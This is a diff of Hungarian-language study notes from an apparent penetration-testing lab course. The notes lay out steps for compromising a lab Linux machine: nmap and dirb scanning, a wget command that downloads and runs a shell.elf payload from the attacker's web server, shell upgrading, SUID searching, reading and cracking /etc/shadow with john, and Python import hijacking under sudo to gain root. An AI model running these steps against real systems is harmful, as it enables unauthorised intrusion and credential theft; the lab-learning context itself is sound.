@@ -329,10 +329,13 @@ ssh -p 1418 (port) student@40.0.2.1 (user@IP)
 
 METERPRETEEN BELÜL execute -f /bin/bash -i -c "find / -perm -u=s 2>/dev/null"
 
+
+
+
 Videó jegyzet:
 
 KÖNNYŰ GÉP:
-LHOST, RHOST-ot kiírni külön jegyzetbe LHOST: 60.0... RHOST: 40.0... v a másik gép 
+LHOST, RHOST-ot kiírni külön jegyzetbe LHOST: 60.0... RHOST: 40.0.50.. v a másik gép 
 elsőnek sudo nmap -sS -sV ip
 ssh-t soha nem törjük, csak ha van felhasználó:jelszó páros
 80-as port, dirb vagy dirbuster
@@ -353,9 +356,33 @@ a mappában ahol van a .elf fájl nyitunk egy python webszervert python3 -m http
 a támadó gépen ahova tudok parancsot írni: cd /tmp;rm -rf shell.elf;wget http://MIIPCÍMÜNK:8000/shell.elf;chmod 777 shell.elf;ls -l /tmp
 ha fent van a támadó gépen akkor /tmp/shell.elf utána a listeneres terminálba menni
 python3 -c "import pty;pty.spawn('/bin/bash')"
+
 sudo -l  - Mihez van jogunk
 ls /home - felhasználók
 ls /home/felhasználó ha nem tudom használni akkor SUID bitek
 find / -perm -u=s 2>/dev/null
+végignézi GTFObinen melyek sérülékenyek
+ha nem akkor ls -l /etc/passwd
+ls -l /etc/shadow - lehet van olvasási jog mindenkinek 
+cat /etc/shadow itt vannak a jelszavak, ROOT-ot és TECHNIKAIT-t nem törünk
+felhasználó: jelszó : az első és második kettőspont között van a jelszó
+copy külön txt fájlba aztán megnézzük a felhasználónak az etc/passwd-ben a sorát és az egész sort is kimásolom egy txt fájlba
+az x helyett szerepeljen a jelszó, a szóközöket kitörlöm - ezt lehet john -nal törni külön fájlba menteni
+sudo john fájl --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt (ezt csak akkor kell, ha a jelszó eleje y-nal kezdődik)
+ha megvan a jelszó akkor su felhasználó vagy ssh-n keresztül belépünk
+
+ls a felhasználó mappáját
+ha mondjuk van egy python program akkor ls -l hogy kinek milyen futtatási joga van rá
+sudo -l megint ha van futtatási jog (mondjuk mindenki nevében tud futtatni) a python-ra akkor a pythonban található import könyvtárt "hijackelem"
+echo 'import.pty;pty.spawn("/bin/bash")' > string.py (vagy amit importál) 
+ekkor sudo-val futttatom a fájlt, így root leszek pl: sudo és a sudo -l -ben megadott elérési útvonal
+
+
+ERŐS GÉP:
+RHOST: 40.0.40...
+sudo nmap -sS -sV ip
+
+
+
 
 
